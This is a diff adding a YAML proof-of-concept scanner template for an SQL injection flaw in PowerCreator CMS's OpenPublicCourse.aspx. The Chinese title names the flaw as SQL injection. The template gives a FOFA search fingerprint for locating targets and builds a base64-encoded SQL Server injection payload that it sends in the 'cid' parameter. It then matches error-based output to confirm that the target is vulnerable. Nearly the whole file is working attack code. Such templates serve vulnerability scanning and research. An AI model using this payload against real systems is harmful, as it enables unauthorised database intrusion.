@@ -1,0 +1,20 @@
+id: poc-yaml-powercreator-openpubliccourse-aspx-sqli
+info:
+  name: PowerCreator OpenPublicCourse.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: powercreator_cms
+  fofa: app="PowerCreator-CMS"
+variables:
+  t1: str(random_int(1000,10000))
+  t2: concat("5 and 1=sys.fn_sqlvarbasetostr(HashBytes('MD5','",t1,"'))--")
+  t3: md5(t1)
+  payload: base64(t2)
+requests:
+- method: GET
+  path: /OpenPublicCourse.aspx?cid={{.payload}}
+  expression: "status_code == 500 && \ncontains(body,\"0x\" + t3) &&\ncontains(body,\"\
+    SqlException\") &&\nmatches(body,\"转换成数据类型(.*?)时失败\") &&\nmatches(body,\"在将(.*?)值\"\
+    )\n"
+transport: http
